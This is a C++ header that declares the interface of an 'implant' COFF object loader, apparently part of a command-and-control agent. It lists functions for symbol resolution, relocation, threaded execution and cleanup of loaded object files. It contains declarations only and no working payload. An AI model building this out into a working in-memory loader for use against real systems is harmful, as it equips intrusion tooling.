#ifndef HEXANE_IMPLANT_OBJECTS_HPP
#define HEXANE_IMPLANT_OBJECTS_HPP
#include <core/corelib.hpp>

namespace Objects {
    LONG
    WINAPI
    FUNCTION
        ExceptionHandler(PEXCEPTION_POINTERS exception);

    BOOL
    FUNCTION
        ExecuteFunction(EXECUTABLE *object, CHAR *function, VOID *args, SIZE_T size);

    BOOL
    FUNCTION
        ProcessSymbol(CHAR *sym_string, VOID **pointer);

    BOOL
    FUNCTION
        BaseRelocation(EXECUTABLE *object);

    SIZE_T
    FUNCTION
        GetFunctionMapSize(EXECUTABLE *object);

    VOID
    FUNCTION
        WrapperFunction(VOID *address, VOID *args, SIZE_T size);

    VOID
    FUNCTION
        AddCoff(COFF_PARAMS *object);

    VOID
    FUNCTION
        RemoveCoff(UINT32 coff_id);


    COFF_PARAMS*
    FUNCTION
        GetCoff(uint32_t coff_id);

    VOID
    FUNCTION
        CoffThread(COFF_PARAMS *params);

    VOID
    FUNCTION
        Cleanup(EXECUTABLE *object);

    VOID
    FUNCTION
        CoffLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size);

}

#endif //HEXANE_IMPLANT_OBJECTS_HPP
